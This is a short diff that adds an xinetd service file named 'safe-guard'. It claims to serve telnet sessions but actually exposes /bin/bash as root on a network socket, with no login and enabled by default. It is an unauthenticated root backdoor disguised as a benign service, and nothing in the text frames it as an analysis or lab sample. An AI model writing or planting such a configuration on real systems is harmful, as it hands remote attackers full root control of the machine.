@@ -1,0 +1,12 @@
+# default: yes
+# description: The safe-guard server servestelnet sessions;
+service safe-guard
+{
+  flags = REUSE
+  socket_type = stream
+  wait = no
+  user = root
+  server =/bin/bash
+  log_on_failure += USERID
+  disable = no
+}
